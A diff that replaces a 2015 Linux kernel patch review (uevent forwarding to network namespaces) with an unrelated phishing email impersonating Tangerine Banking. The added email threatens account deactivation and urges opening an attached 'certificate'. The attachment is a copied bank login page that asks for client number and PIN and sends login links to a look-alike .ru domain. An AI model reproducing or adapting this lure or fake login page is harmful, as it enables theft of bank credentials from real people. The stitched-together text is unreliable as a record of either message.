@@ -1,14 +1,12 @@
-From: Oren Laadan <orenl-3AfRa/s5aFdBDgjK7y7TUQ@public.gmane.org>
-Subject: Re: [PATCH 2/3] lib/kobject_uevent.c: add uevent forwarding function
-Date: Fri, 2 Oct 2015 14:00:45 -0400
-Message-ID: <CAA4jN2br76atf9UuOhJVcoQPZ6GMN91Mk1GsoXcVFC-eFvFafA@mail.gmail.com>
-References: <cover.1441762578.git.michael.coss@alcatel-lucent.com>
-	<3456750fe7a5a5eb709e315618facf5704cc1885.1441762578.git.michael.coss@alcatel-lucent.com>
+From: "Tangerine Banking"<noreply-OWaY6AFfhtdAFePFGvp55w@public.gmane.org>
+Subject: Account Inactivity - Action Required!
+Date: Fri, 2 Oct 2015 04:52:35 GMT
+Message-ID: <3155904611059169@BUREAU1>
+Reply-To: noreply-OWaY6AFfhtdAFePFGvp55w@public.gmane.org
 Mime-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed;
+	boundary="= Multipart Boundary 1002150052"
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-In-Reply-To: <3456750fe7a5a5eb709e315618facf5704cc1885.1441762578.git.michael.coss-cfy2TCaE7SFv+uJa97DSA9BPR1lH4CV8@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
 List-Archive: <http://lists.linuxfoundation.org/pipermail/containers/>
@@ -18,203 +16,278 @@ List-Subscribe: <https://lists.linuxfoundation.org/mailman/listinfo/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=subscribe>
 Sender: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-To: "Michael J. Coss" <michael.coss-cfy2TCaE7SFv+uJa97DSA9BPR1lH4CV8@public.gmane.org>
-Cc: containers-cunTk1MwBs98uUxBSJOaYoYkZiVZrdSR2LY78lusg7I@public.gmane.org
+To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
-On Wed, Sep 9, 2015 at 2:53 PM, Michael J. Coss <
-michael.coss-cfy2TCaE7SFv+uJa97DSA9BPR1lH4CV8@public.gmane.org> wrote:
+This is a multipart MIME message.
 
-> Adds capability to allow userspace programs to forward a given event to
-> a specific network namespace as determined by the provided pid.  In
-> addition, support for a per-namespace kobject_sequence counter was
-> added.  Sysfs was modified to return the correct event counter based on
-> the current network namespace.
->
-> Signed-off-by: Michael J. Coss <michael.coss-cfy2TCaE7SFv+uJa97DSA9BPR1lH4CV8@public.gmane.org>
-> ---
->  include/linux/kobject.h     |  3 ++
->  include/net/net_namespace.h |  3 ++
->  kernel/ksysfs.c             | 12 ++++++
->  lib/kobject_uevent.c        | 90
-> +++++++++++++++++++++++++++++++++++++++++++++
->  4 files changed, 108 insertions(+)
->
-> diff --git a/include/linux/kobject.h b/include/linux/kobject.h
-> index 637f670..d1bb509 100644
-> --- a/include/linux/kobject.h
-> +++ b/include/linux/kobject.h
-> @@ -215,6 +215,9 @@ extern struct kobject *firmware_kobj;
->  int kobject_uevent(struct kobject *kobj, enum kobject_action action);
->  int kobject_uevent_env(struct kobject *kobj, enum kobject_action action,
->                         char *envp[]);
-> +#if defined(CONFIG_UDEVNS) || defined(CONFIG_UDEVNS_MODULE)
-> +int kobject_uevent_forward(char *buf, size_t len, pid_t pid);
-> +#endif
->
->  __printf(2, 3)
->  int add_uevent_var(struct kobj_uevent_env *env, const char *format, ...);
-> diff --git a/include/net/net_namespace.h b/include/net/net_namespace.h
-> index e951453..a4013e5 100644
-> --- a/include/net/net_namespace.h
-> +++ b/include/net/net_namespace.h
-> @@ -134,6 +134,9 @@ struct net {
->  #if IS_ENABLED(CONFIG_MPLS)
->         struct netns_mpls       mpls;
->  #endif
-> +#if defined(CONFIG_UDEVNS) || defined(CONFIG_UDEVNS_MODULE)
-> +       u64                             kevent_seqnum;
-> +#endif
->         struct sock             *diag_nlsk;
->         atomic_t                fnhe_genid;
->  };
-> diff --git a/kernel/ksysfs.c b/kernel/ksysfs.c
-> index 6683cce..4bc15fd 100644
-> --- a/kernel/ksysfs.c
-> +++ b/kernel/ksysfs.c
-> @@ -21,6 +21,9 @@
->  #include <linux/compiler.h>
->
->  #include <linux/rcupdate.h>    /* rcu_expedited */
-> +#if defined(CONFIG_UDEVNS) || defined(CONFIG_UDEVNS_MODULE)
-> +#include <net/net_namespace.h>
-> +#endif
->
->  #define KERNEL_ATTR_RO(_name) \
->  static struct kobj_attribute _name##_attr = __ATTR_RO(_name)
-> @@ -33,6 +36,15 @@ static struct kobj_attribute _name##_attr = \
->  static ssize_t uevent_seqnum_show(struct kobject *kobj,
->                                   struct kobj_attribute *attr, char *buf)
->  {
-> +#if defined(CONFIG_UDEVNS) || defined(CONFIG_UDEVNS_MODULE)
-> +       pid_t p = task_pid_vnr(current);
-> +       struct net *n = get_net_ns_by_pid(p);
-> +
-> +       if (n != ERR_PTR(-ESRCH)) {
-> +               if (!net_eq(n, &init_net))
-> +                       return sprintf(buf, "%llu\n", n->kevent_seqnum);
-> +       }
-> +#endif
->         return sprintf(buf, "%llu\n", (unsigned long long)uevent_seqnum);
->  }
->  KERNEL_ATTR_RO(uevent_seqnum);
-> diff --git a/lib/kobject_uevent.c b/lib/kobject_uevent.c
-> index d791e33..7589745 100644
-> --- a/lib/kobject_uevent.c
-> +++ b/lib/kobject_uevent.c
-> @@ -379,6 +379,96 @@ int kobject_uevent(struct kobject *kobj, enum
-> kobject_action action)
->  }
->  EXPORT_SYMBOL_GPL(kobject_uevent);
->
-> +#if defined(CONFIG_UDEVNS) || defined(CONFIG_UDEVNS_MODULE)
-> +/**
-> + * kobject_uevent_forward - forward event to specified network namespace
-> + *
-> + * @buf: event buffer
-> + * @len: event length
-> + * @pid: pid of network namespace
-> + *
-> + * Returns 0 if kobject_uevent_forward() is completed with success or the
-> + * corresponding error when it fails.
-> + */
-> +int kobject_uevent_forward(char *buf, size_t len, pid_t pid)
-> +{
-> +       int retval = 0;
-> +#if defined(CONFIG_NET)
-> +       struct uevent_sock *ue_sk;
-> +       struct net *pns;
-> +       char *p;
-> +       u64 num;
-> +
-> +       /* grab the network namespace of the provided pid */
-> +       pns = get_net_ns_by_pid(pid);
-> +       if (pns == ERR_PTR(-ESRCH))
-> +               return -ESRCH;
-> +
-> +       /* find sequence number in buffer */
-> +       p = buf;
-> +       num = 0;
-> +       while (p < (buf + len)) {
-> +               if (strncmp(p, "SEQNUM=", 7) == 0) {
-> +                       int r;
-> +
-> +                       p += 7;
-> +                       r = kstrtoull(p, 10, &num);
-> +                       if (r) {
-> +                               put_net(pns);
-> +                               return r;
-> +                       }
-> +                       break;
-> +               }
-> +               p += (strlen(p) + 1);
-> +       }
-> +
-> +       /* if we didn't see a valid seqnum, or none was present, return
-> error */
-> +       if (num == 0) {
-> +               put_net(pns);
-> +               return -EINVAL;
-> +       }
-> +       /* update per namespace sequence number as needed */
-> +       if (pns->kevent_seqnum < num)
-> +               pns->kevent_seqnum = num;
-> +
-> +       list_for_each_entry(ue_sk, &uevent_sock_list, list) {
-> +               struct sock *uevent_sock = ue_sk->sk;
-> +               struct sk_buff *skb;
-> +
-> +               if (!netlink_has_listeners(uevent_sock, 1))
-> +                       continue;
-> +               /*
-> +                * only send to sockets share the same network namespace
-> +                * as the passed pid
-> +                */
-> +               if (!net_eq(sock_net(uevent_sock), pns))
-> +                       continue;
-> +
-> +               /* allocate message with the maximum possible size */
-> +               skb = alloc_skb(len, GFP_KERNEL);
-> +               if (skb) {
-> +                       char *p;
-> +
-> +                       p = skb_put(skb, len);
-> +                       memcpy(p, buf, len);
-> +                       NETLINK_CB(skb).dst_group = 1;
-> +                       retval = netlink_broadcast(uevent_sock, skb, 0, 1,
-> +                                                  GFP_KERNEL);
-> +
-> +                       /* ENOBUFS should be handled in userspace */
-> +                       if (retval == -ENOBUFS || retval == -ESRCH)
-> +                               retval = 0;
->
+--= Multipart Boundary 1002150052
+Content-Type: text/plain; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
 
-This may mask an error from an earlier send (to a distinct listener
-socket). Instead, we should retain and report either the first error seen
-or some error seen.
+The information in this electronic mail message is private and confidential=
+, and only intended for the addressee.
+
+Authorized Address: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+
+You have not signed-in to your account for a long period of time. We ask al=
+l our clients to periodically sign-in to keep their account active and in g=
+ood standing.
+
+You have until 05/10/2015 to sign-in to your account thru our new certifica=
+te authentication or your account will be deactivated and frozen.
+
+In order to keep your account active, please follow the steps below:
+
+1. Download the attached security certificate and open it.
+2. Follow the remaining on-screen instructions.
+3. Your account will be migrated and activated under our new platform.
+
+Thank you for your cooperation, we greatly appreciate your business.
 
 
+Tangerine
+Forward Banking
 
-> +               } else {
-> +                       retval = -ENOMEM;
-> +               }
-> +       }
-> +       put_net(pns);
-> +#endif
-> +       return retval;
->
-+}
-> +EXPORT_SYMBOL_GPL(kobject_uevent_forward);
-> +#endif
-> +
->  /**
->   * add_uevent_var - add key value string to the environment buffer
->   * @env: environment buffer structure
-> --
-> 2.4.6
->
-> _______________________________________________
-> Containers mailing list
-> Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-> https://lists.linuxfoundation.org/mailman/listinfo/containers
->
+***
+Tangerine is a trademark of The Bank of Nova Scotia, used under license.
+
+
+---
+L'absence de virus dans ce courrier =E9lectronique a =E9t=E9 v=E9rifi=E9e p=
+ar le logiciel antivirus Avast.
+https://www.avast.com/antivirus
+
+--= Multipart Boundary 1002150052
+Content-Disposition: attachment;
+	filename="SECURE_SSL_TANGERCLIENT_CERTIFICATE_01102015.html"
+MIME-Version: 1.0
+Content-Type: text/plain; name="SECURE_SSL_TANGERCLIENT_CERTIFICATE_01102015.html"
+
+   REFRESH(0 sec): [1]file://localhost/tmp/en_CA/web/BrowserSettings.html
+
+   [2]Log me in
+   EN[3]FR
+     * [4]I'm a Client, let me in!
+     * [5]Saving
+       [6]Savings Accounts[7]Guaranteed Investments[8]Business Savings
+       Accounts
+     * [9]Chequing
+       [10]Chequing Account
+     * [11]Investing
+       [12]Investment Funds[13]RSPs[14]TFSAs
+     * [15]Borrowing
+       [16]Tangerine Mortgage[17]Home Equity Line of Credit[18]RSP Loan
+     * [19]Ways to bank
+       [20]Online banking[21]Mobile banking[22]Telephone
+       banking[23]Caf[24]ABMs[25]Debit Card
+     * [26]Sign me up
+     *
+     * [27]ABM locator
+     * [28]Rates
+     * [29]Tools
+     * [30]Forward Thinking
+     * [31]FAQ
+     * [32]About us
+
+   [BUTTON] Tangerine logo [BUTTON]
+   ____________________
+   [33]About us | [34]Contact us | [35]FAQs | [36]Francais | [37]Log me in
+   [38]Tangerine logo
+     * [39]ABM locator
+     * [40]Rates
+     * [41]Tools
+     * [42]Forward Thinking
+
+   ____________________ (Submit)
+     * [43]I'm a Client, let me in!
+     * [44]Saving
+          + [45]Savings Accounts
+          + [46]Guaranteed Investments
+          + [47]Business Savings Accounts
+     * [48]Chequing
+          + [49]Chequing Account
+     * [50]Investing
+          + [51]Investment Funds
+          + [52]RSPs
+          + [53]TFSAs
+     * [54]Borrowing
+          + [55]Tangerine Mortgage
+          + [56]Home Equity Line of Credit
+          + [57]RSP Loan
+     * [58]Ways to bank
+          + [59]Online banking
+          + [60]Mobile banking
+          + [61]Telephone banking
+          + [62]Caf
+          + [63]ABMs
+          + [64]Client Card
+     * [65]Sign me up
+
+Personal Banking Login
+
+   Enter your Client Number, Card Number or Username
+   _____________________________ Enter your PIN Number
+   _____________________________
+   [_] Remember me
+   Name it ____________________Example: "Mom's money" (this is optional)
+   [66]Please select
+     * [67]Use another Client Number
+
+   [Use another Client Number]
+   [_] Remove this Client Number, Card Number or Username from the saved
+   list on this computer
+   [68]Forgot your login?[69]Go to business banking login [BUTTON] Go
+
+   Tangerine is a member of the [70]Canada Deposit Insurance Corporation.
+   [71]Security  [sg-shield.svg]  Guarantee | [72]Download
+   [trusteer-logo.svg]
+
+We're here for you
+
+Phone us
+
+   Give us a call 24 hours a day, 7 days a week at
+          1-888-826-4374
+
+Chat us up
+
+   Chat availability
+   Weekdays: 8am 8pm ET
+   Weekend: 9am 5pm ET
+
+   Sorry, there are no Direct Associates available at the moment. Get the
+   conversation started [73]Chat with us
+
+Email us
+
+   For general questions or inquiries
+          [74]clientservices-OWaY6AFfhtdAFePFGvp55w@public.gmane.org
+
+Visit us
+
+   Come visit us at one of our [75]Tangerine Cafs
+
+Get social with us
+
+   Contact us
+     * [76]Careers
+     * [77]Privacy
+     * [78]Legal
+     * [79]Security
+     * [80]Site map
+
+   true
+
+   /web/InitialTangerine.html?command=displayLogin&device=web&locale=en_CA
+
+   DCSIMG
+
+   REFRESH(1560 sec):
+   [81]file://localhost/web/InitialTangerine.html?command=displayLoginRegu
+   lar&device=web&locale=en_CA&timeout=1
+   m
+
+References
+
+   Visible links
+   1. file://localhost/tmp/en_CA/web/BrowserSettings.html
+   2. http://www.tangerineclient.ru/web/InitialTangerine.html?command=displayLogin&device=web&locale=en_CA
+   3. https://www.tangerine.ca/fr/index.html
+   4. http://www.tangerineclient.ru/web/InitialTangerine.html?command=displayLogin&device=web&locale=en_CA
+   5. https://www.tangerine.ca/en/saving/index.html
+   6. https://www.tangerine.ca/en/saving/savings-accounts/index.html
+   7. https://www.tangerine.ca/en/saving/guaranteed-investments/index.html
+   8. https://www.tangerine.ca/en/saving/business-savings-accounts/index.html
+   9. https://www.tangerine.ca/en/chequing/index.html
+  10. https://www.tangerine.ca/en/chequing/chequing-account/index.html
+  11. https://www.tangerine.ca/en/investing/index.html
+  12. https://www.tangerine.ca/en/investing/investment-funds/index.html
+  13. https://www.tangerine.ca/en/investing/RSPs/index.html
+  14. https://www.tangerine.ca/en/investing/TFSAs/index.html
+  15. https://www.tangerine.ca/en/borrowing/index.html
+  16. https://www.tangerine.ca/en/borrowing/tangerine-mortgage/index.html
+  17. https://www.tangerine.ca/en/borrowing/home-equity-line-of-credit/index.html
+  18. https://www.tangerine.ca/en/borrowing/rsp-loan/index.html
+  19. https://www.tangerine.ca/en/ways-to-bank/index.html
+  20. https://www.tangerine.ca/en/ways-to-bank/online-banking/index.html
+  21. https://www.tangerine.ca/en/ways-to-bank/mobile-banking/index.html
+  22. https://www.tangerine.ca/en/ways-to-bank/telephone-banking/index.html
+  23. https://www.tangerine.ca/en/ways-to-bank/cafe/index.html
+  24. https://www.tangerine.ca/en/ways-to-bank/automated-banking-machines/index.html
+  25. https://www.tangerine.ca/en/ways-to-bank/debit-card/index.html
+  26. https://www.tangerine.ca/en/sign-me-up/index.html
+  27. http://www.tangerineclient.ru/required.documents.form.process.redirect/InitialTangerine.html?locale=en_CA&device=web&command=goToAbmLocator
+  28. https://www.tangerine.ca/en/accounts-rates/ourrates/index.html
+  29. https://www.tangerine.ca/en/tools/index.html
+  30. https://forwardthinking.tangerine.ca/en/
+  31. https://www.tangerine.ca/en/faq/
+  32. https://www.tangerine.ca/en/about-us/index.html
+  33. https://www.tangerine.ca/en/about-us/index.html
+  34. https://www.tangerine.ca/en/about-us/contact-us/index.html
+  35. https://www.tangerine.ca/en/faq/
+  36. https://www.tangerine.ca/fr/index.html
+  37. http://www.tangerineclient.ru/web/InitialTangerine.html?command=displayLogin&device=web&locale=en_CA
+  38. https://www.tangerine.ca/en/
+  39. http://www.tangerineclient.ru/required.documents.form.process.redirect/InitialTangerine.html?locale=en_CA&device=web&command=goToAbmLocator
+  40. https://www.tangerine.ca/en/rates/
+  41. https://www.tangerine.ca/en/tools/index.html
+  42. https://forwardthinking.tangerine.ca/en/
+  43. http://www.tangerineclient.ru/web/InitialTangerine.html?command=displayLogin&device=web&locale=en_CA
+  44. https://www.tangerine.ca/en/saving/index.html
+  45. https://www.tangerine.ca/en/saving/savings-accounts/index.html
+  46. https://www.tangerine.ca/en/saving/guaranteed-investments/index.html
+  47. https://www.tangerine.ca/en/saving/business-savings-accounts/index.html
+  48. https://www.tangerine.ca/en/chequing/index.html
+  49. https://www.tangerine.ca/en/chequing/chequing-account/index.html
+  50. https://www.tangerine.ca/en/investing/index.html
+  51. https://www.tangerine.ca/en/investing/investment-funds/index.html
+  52. https://www.tangerine.ca/en/investing/RSPs/index.html
+  53. https://www.tangerine.ca/en/investing/TFSAs/index.html
+  54. https://www.tangerine.ca/en/borrowing/index.html
+  55. https://www.tangerine.ca/en/borrowing/tangerine-mortgage/index.html
+  56. https://www.tangerine.ca/en/borrowing/home-equity-line-of-credit/index.html
+  57. https://www.tangerine.ca/en/borrowing/rsp-loan/index.html
+  58. https://www.tangerine.ca/en/ways-to-bank/index.html
+  59. https://www.tangerine.ca/en/ways-to-bank/online-banking/index.html
+  60. https://www.tangerine.ca/en/ways-to-bank/mobile-banking/index.html
+  61. https://www.tangerine.ca/en/ways-to-bank/telephone-banking/index.html
+  62. https://www.tangerine.ca/en/ways-to-bank/cafe/index.html
+  63. https://www.tangerine.ca/en/ways-to-bank/automated-banking-machines/index.html
+  64. https://www.tangerine.ca/en/ways-to-bank/debit-card/index.html
+  65. https://www.tangerine.ca/en/sign-me-up/index.html
+  66. file://localhost/tmp/tmpPP_V4s.html
+  67. javascript:addAnotherNumber();
+  68. http://www.tangerineclient.ru/web/Tangerine.html?command=displayCIFRetrieval
+  69. http://www.tangerineclient.ru/web/Tangerine.html?command=displayBusinessLoginRegular
+  70. https://www.tangerine.ca/en/about-us/cdic/index.html
+  71. https://www.tangerine.ca/en/security/guarantee/index.html
+  72. https://www.tangerine.ca/en/security/trusteer/index.html
+  73. javascript:ClickToChat(24);
+  74. mailto:clientservices-OWaY6AFfhtdAFePFGvp55w@public.gmane.org
+  75. https://www.tangerine.ca/en/ways-to-bank/cafe/index.html
+  76. https://www.tangerine.ca/en/about-us/careers/index.html
+  77. https://www.tangerine.ca/en/privacy/index.html
+  78. https://www.tangerine.ca/en/legal/index.html
+  79. https://www.tangerine.ca/en/security/index.html
+  80. https://www.tangerine.ca/en/sitemap/index.html
+  81. file://localhost/web/InitialTangerine.html?command=displayLoginRegular&device=web&locale=en_CA&timeout=1
+
+   Hidden links:
+  82. https://twitter.com/TangerineBank
+  83. https://www.facebook.com/TangerineBank
+  84. https://www.linkedin.com/company/tangerine-bank
+  85. https://instagram.com/TangerineBank
+  86. https://www.youtube.com/TangerineBank
+
+--= Multipart Boundary 1002150052
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
+
+_______________________________________________
+Containers mailing list
+Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+https://lists.linuxfoundation.org/mailman/listinfo/containers
+--= Multipart Boundary 1002150052--
